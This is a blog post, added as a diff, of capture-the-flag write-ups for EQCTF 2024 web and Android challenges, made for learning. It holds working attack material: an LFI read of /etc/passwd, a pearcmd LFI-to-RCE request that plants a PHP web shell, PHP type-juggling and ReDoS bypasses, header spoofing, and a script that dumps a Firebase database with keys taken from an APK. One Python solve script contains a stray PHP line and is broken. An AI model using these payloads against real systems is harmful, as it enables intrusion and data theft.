@@ -1,0 +1,370 @@
+---
+title: 'EQCTF CTF 2024 Challengesp'
+description: 'Challenges made by otai, solved by skiddies'
+date: 2024-12-25
+tags: ['writeups']
+image: './EQCTF.png'
+authors: ['aan']
+---
+
+# Web
+
+## Sourceful Egg
+
+### Analysis
+
+First you need to send a `POST` request with the data `egg` to access inside the `if` block.
+
+```php
+ if (isset($_POST['egg'])) {
+
+    random codes...
+
+} else {
+    echo "You're not even touching the egg...?!!!<br><br>";
+    echo "Anyway, here's a picture of an egg <br><br><img src='img/togepi.gif'>";
+}
+```
+
+Now inside the `if` block there are `two functions` you need to consider.
+
+#### eggSecret Function
+
+```php
+   $secretHash = '00e39786989574093743872279278460'; //can remove the first '0'
+   $eggWorthyStatus = false;
+
+  if (isset($_GET['eggSecret'])) {
+
+        if (md5($_GET['eggSecret']) == $secretHash) { <-- vulnerable condition
+            $eggWorthyStatus = true;
+        } else {
+            $eggWorthyStatus = false;
+        }
+    }
+```
+
+Php is a bit weird, if you `md5(240610708)` is is technically will be the same as `0` but it only works in one condition, which is when using `==` operator.
+
+> `md5(240610708) = 0e462097431906509019562988736854 = 0 (when ==)`
+
+So if we are comparing `0e462097431906509019562988736854` and `00e39786989574093743872279278460` with `==` it is technically true because `0 == 0`
+
+#### egg Function
+
+```php
+ $egg = $_POST['egg'];
+
+    if (preg_match("/^(.*?)+$/s", $egg)) { <-- vulnerable condition
+        echo "Find me the egg please";
+    } else {
+        if ($eggWorthyStatus) {
+            echo "You are a true egg connoisseur! Here is your egg flag: " . file_get_contents('flag.txt');
+        } else {
+            echo "Find me the egg please";
+        }
+    }
+```
+
+That `preg_match("/^(.*?)+$/s", $egg)` condition is vulnerable to [ReDoS](https://learn.snyk.io/lesson/redos), to bypass it just spam as many `AAA's` as you can.
+
+### Solve Script
+
+```python
+import requests
+
+url = 'http://135.181.88.229:33722?eggSecret=240610708'
+payload = 'A' * 33009
+
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Content-Length': str(len(payload))
+}
+
+data = {'egg': payload}
+preg_match("/^(.*?)+$/s", $egg)
+response = requests.post(url, headers=headers, data=data)
+print(response.text)
+```
+
+## King Brews
+
+### Analysis
+
+This is blackbox challenge so I can't show you the source code.
+
+If you press any menu, you will be sending `GET` request with the parameter `page` like so:-
+
+http://135.181.88.229:50003/?page=about.php
+
+### Solve Script
+
+To test if the website is vulnerable to LFI, you can try to do the good ol' trick `../../../../`
+
+http://135.181.88.229:50003/?page=../../../../../../etc/passwd
+
+![alt text](./imageEq.png)
+
+If you somehow managed to read the `/etc/passwd` which is a sensitive file that means the website is vulnerable to LFI.
+
+So now, all you need to do is find the flag, the challenge creator actually provided a hint where the flag is located.
+
+![alt text](./imageEq2.png)
+
+If you hover on that button, it redirect to `menu.php`, so let's try to find out how to read `menu.php`
+
+You can actually chain `LFI` to `RCE` if the code allows you to include `php wrapper` in input or if the website has `pearcmd` enabled.
+
+In this case I'm using this method instead [Pearcmd LFI to RCE](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI-to-RCE.md#lfi-to-rce-via-php-pearcmd)
+
+```python
+import requests
+
+url = "http://135.181.88.229:50003"
+
+r1 = requests.get(f"{url}/?page=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+")
+print(r1.text)
+
+r2 = requests.get(f"{url}/?page=/tmp/exec.php&c=cat+menu.php")
+print(r2.text)
+```
+
+## Secret Access (Unintended)
+
+### Analysis
+
+We need to send both `secret` and `code` parameters using `GET` request.
+
+```php
+ if (!isset($_GET['secret']) || !isset($_GET['code'])) {
+        die("Missing required parameters.");
+    }
+```
+
+Right after that there are couple of `header` request that you need to include to follow the `if` condition requirement.
+
+```php
+if (!isset($_SERVER['HTTP_X_REMOTE_IP']) || $_SERVER['HTTP_X_REMOTE_IP'] !== '127.0.0.1') {
+        die("Something is not quite right...");
+    }
+
+    if (!isset($_SERVER['HTTP_USER_AGENT']) || $_SERVER['HTTP_USER_AGENT'] !== 'CTF-Challenge-Agent') {
+        die("Something is not quite right...");
+    }
+
+    if (!isset($_SERVER['HTTP_X_AUTH_KEY']) || !is_valid_auth_key($_SERVER['HTTP_X_AUTH_KEY'])) {
+        die("Something is not quite right...");
+    }
+
+    if (is_valid_secret($secret) && is_valid_code($code)) {
+        echo "Not bad! Here is your flag: [REDACTED]";
+    } else {
+        echo "Parameter value incorrect";
+    }
+```
+
+Then, you need to find out how to decode the `secret` value from this function, actually, the intended solution is to do `php type juggling` but I managed to decode everything one by one and `URL Encode` the values lol.
+
+```php
+function is_valid_secret($secret) {
+    $keys1 = [12, 23, 34, 45, 56, 67, 78, 89, 90]; // XOR Keys
+    $keys2 = [91, 82, 73, 64, 55, 46, 37, 28, 19];
+
+    $encoded_parts = [
+        'ND0=', 'Yz0=', 'Ij0=', 'TT0=', 'ZD0=', 'bz0=', 'dz0=', 'cj0=', 'cz0='
+    ];
+
+    $order = [6, 8, 3, 0, 4, 7, 1, 2, 5];
+
+    $decoded_secret = '';
+
+    $reassembled = '';
+    foreach ($order as $index) {
+        $reassembled .= base64_decode($encoded_parts[$index]);
+    }
+
+    for ($i = 0; $i < strlen($reassembled); $i++) {
+        $char = ord($reassembled[$i]) ^ $keys2[$i];
+        $decoded_secret .= chr($char ^ $keys1[$i]);
+    }
+
+    echo $decoded_secret; <-- actually you can just host it locally and get the values straight away (got funny chars so url encode it is better)
+    return strcmp($secret, $decoded_secret) == 0;
+}
+```
+
+The `secret` values you should get `+x%18PBP_x-%3Dr%3Dc%3D%22%3Do%3D`.
+
+Next we have `is_valid_code()` function, for this one you need to do `php type juggling` but using empty array, so `code=[]`.
+
+```php
+function is_valid_code($code) {
+    return $code == 0 && $code !== '0' && $code !== 0;
+}
+```
+
+The last function is actually to ensure that the `X-AUTH-KEY` header to have a specific pattern of value
+
+```php
+function is_valid_auth_key($key) {
+    return substr($key, 0, 5) === "auth-" && strlen($key) === 10;
+}
+```
+
+1. `substr($key, 0, 5) === "auth-"` - Must start with exactly "auth-"
+2. `strlen($key) === 10` - Total length must be exactly 10 characters
+
+### Solve Script
+
+```python
+import urllib.request
+
+url = "http://135.181.88.229:33430/?secret=%20x%18PBP_x-%3Dr%3Dc%3D%22%3Do%3D&code=[]"
+headers = {
+'User-Agent': 'CTF-Challenge-Agent',
+'X-REMOTE-IP': '127.0.0.1',
+'X-AUTH-KEY': 'auth-12345'
+}
+
+req = urllib.request.Request(url, headers=headers)
+response = urllib.request.urlopen(req)
+print(response.read().decode())
+```
+
+## Protecc
+
+### Analysis
+
+### Solve Script
+
+## PAAS
+
+### Analysis
+
+### Solve Script
+
+# Mobile
+
+## Who's that Pukimon
+
+First off, try to get the source code of the apk by either `unzipping` normally or you can use `MobSF Framework`.
+
+Analyzing the source codes, there are 7 potential activities files
+
+1. **_io.eqctf.pukimon.MainActivity_**
+2. com.google.firebase.auth.internal.GenericIdpActivity
+3. com.google.firebase.auth.internal.RecaptchaActivity
+4. androidx.credentials.playservices.HiddenActivity
+5. com.google.android.gms.auth.api.signin.internal.SignInHubActivity
+6. com.google.android.gms.common.api.GoogleApiActivity
+7. com.google.android.play.core.common.PlayCoreDialogWrapperActivity
+
+By looking at the names `io.eqctf.pukimon.MainActivity` is definitely the MainActivity file and apart from that `com.google.firebase.auth.internal.GenericIdpActivity` and `com.google.firebase.auth.internal.RecaptchaActivity` gives us a clear view that this apk is using `Firebase` as its database.
+
+### Content of MainActivityKt.java
+
+So this file can be found inside `io.eqctf.pukimon.MainActivity`, I prompted it to gpt cuz I'm bad at reading code.
+
+This function here checks if our input converted to hex matches the value `5368726f6f6d6973686965`.
+
+> Convert Hex to ASCII
+> 5368726f6f6d6973686965 == Shroomishie
+
+```java
+private static final boolean a(String str) {
+    byte[] bytes = str.getBytes(Charsets.UTF_8);
+    if (Intrinsics.areEqual(ArraysKt.joinToString$default(bytes, "", null, null, 0, null,
+        new Function1() {
+            public final Object invoke(Object obj) {
+                return MainActivityKt.a$lambda$3(((Byte) obj).byteValue());
+            }
+        }, 30, null), "5368726f6f6d6973686965")) {
+        return true;
+    }
+    return false;
+}
+```
+
+When correctly guessed, it logs the flag, you can retrieve the value either by reading the `source code` or by using `adb logcat` command.
+
+```java
+byte[] decode = Base64.decode("AEUAUQBDAFQARgB7ADEAVABzAF8AUwBoAHIAMABvAE0AcgAxAHMASABpAEUAIQAhACEAIQB9", 0);
+Log.d("Flag", "Congratz on guessing the pokemon: ".concat(new String(decode, Charsets.UTF_8)));
+```
+
+## Capture that Pukimon
+
+This challenge you need to intercept the request that the mobile is making to `Firebase`. How do I know that it is making some kind of communication to `Firebase`?
+
+Inside the same file if your input is correct which is `Shroomishie` it will take that input and use it as a path to fetch data from `Firebase`
+
+```java
+private static final boolean a(String str, final Function1<? super String, Unit> function1) {
+    DatabaseReference reference = FirebaseDatabase.getInstance().getReference(str);
+    Intrinsics.checkNotNullExpressionValue(reference, "getReference(...)");
+    Task<DataSnapshot> task = reference.get();
+    // ... event handlers for success/failure
+}
+```
+
+So to intercept the communication just use proxy tools like `Burp Suite` or `HTTPToolkit` but you need to remember... that the traffic is using `websocket` and not `HTTP`.
+
+As you can see here there is a `GET` request to `s-usc1f-nss-2568.firebaseio.com `, just take a look at the responses, the flag is in one of em.
+
+![alt text](./imageEq3.png)
+
+## Cook that Pukimon
+
+Lastly if you use apktool to decompile the apk, you noticed that there is `strings.xml` inside `res/values`.
+
+If you take a look inside it, there are a couple of `sensitive` information inside it.
+
+```xml
+<string name="gcm_defaultSenderId">402409561826</string>
+<string name="google_api_key">AIzaSyBKr-_5vWCd4wT0Q9W50vWtaA7meeCYcss</string>
+<string name="google_app_id">1:402409561826:android:e9d44b894477f95e6f88bb</string>
+<string name="google_crash_reporting_api_key">AIzaSyBKr-_5vWCd4wT0Q9W50vWtaA7meeCYcss</string>
+<string name="google_storage_bucket">eqctf-pukimon1.firebasestorage.app</string>
+```
+
+Now for this part I need refer to someone else [writeups](https://medium.com/@AhmedMhesham/ascwg-ctf-2024-android-challenges-solution-source-code-8c57ffccdcd2) to understand how to connect to `Firebase` since I have no experience in using it. Inside the article there is a dart script that will be able to extract informations from the database.
+
+Here is my own script, I prefer to use JS instead.
+
+```js
+const { initializeApp } = require('firebase/app')
+const { getDatabase, ref, get } = require('firebase/database')
+const { getAuth, signInAnonymously } = require('firebase/auth')
+
+const firebaseConfig = {
+  apiKey: 'AIzaSyBKr-_5vWCd4wT0Q9W50vWtaA7meeCYcss',
+  authDomain: 'eqctf-pukimon1.firebaseapp.com',
+  databaseURL: 'https://eqctf-pukimon1-default-rtdb.firebaseio.com',
+  projectId: 'eqctf-pukimon1',
+  storageBucket: 'eqctf-pukimon1.firebasestorage.app',
+  messagingSenderId: '402409561826',
+  appId: '1:402409561826:android:e9d44b894477f95e6f88bb',
+}
+
+const app = initializeApp(firebaseConfig)
+const database = getDatabase(app)
+const auth = getAuth(app)
+
+async function readData() {
+  try {
+    await signInAnonymously(auth)
+    const dbRef = ref(database)
+    const snapshot = await get(dbRef)
+
+    if (snapshot.exists()) {
+      console.log('Data from database:', snapshot.val())
+    } else {
+      console.log('No data available')
+    }
+  } catch (error) {
+    console.error('Error:', error)
+  }
+}
+
+readData()
+```
